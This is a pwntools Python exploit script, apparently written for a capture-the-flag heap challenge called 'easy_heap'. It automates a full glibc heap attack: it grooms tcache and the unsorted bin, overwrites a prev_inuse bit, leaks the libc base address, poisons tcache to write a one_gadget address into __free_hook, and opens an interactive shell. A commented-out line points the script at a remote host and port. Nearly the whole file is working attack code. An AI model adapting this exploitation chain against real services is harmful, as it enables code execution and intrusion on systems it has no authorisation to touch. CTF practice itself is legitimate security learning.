from pwn import *

context.log_level = 'debug'

def malloc(size,content):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('> ')
	p.sendline(str(size))
	p.recvuntil('> ')
	p.sendline(content)

def free(index):
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('> ')
	p.sendline(str(index))

def puts(index):
	p.recvuntil('> ')
	p.sendline('3')
	p.recvuntil('> ')
	p.sendline(str(index))

p = process('./easy_heap')
#p = remote('118.25.150.134',6666 )

for i in range(10):
	malloc(0x20,'a')

for i in range(3,10):
	free(i)

for i in range(3):
	free(i)

for i in range(10):
	malloc(0x20,'a')


for i in range(6):
	free(i)

free(8) #fill tcache
free(7) #unsorted bin

malloc(0xf8,'b') #change next_chunk pre_inuse = 0

free(6) #fill tcache
free(9) #unsorted bin

for i in range(8):
	malloc(0x20,'b')

#leak libc
puts(0)

libc_base = u64(p.recv(6).ljust(8,'\x00')) - 96 - 0x3ebc40
log.success('libc base addr : 0x%x'%libc_base)
free_hook = libc_base + 0x3ed8e8
one_gadget = libc_base + 0x4f322
log.success('free_hook addr : 0x%x'%free_hook)
log.success('one_gadget addr : 0x%x'%one_gadget)

malloc(0x20,'d')


free(1)

free(0)
free(9)


malloc(0x20,p64(free_hook))
malloc(0x20,'e')

malloc(0x20,p64(one_gadget))


free(5)


p.interactive()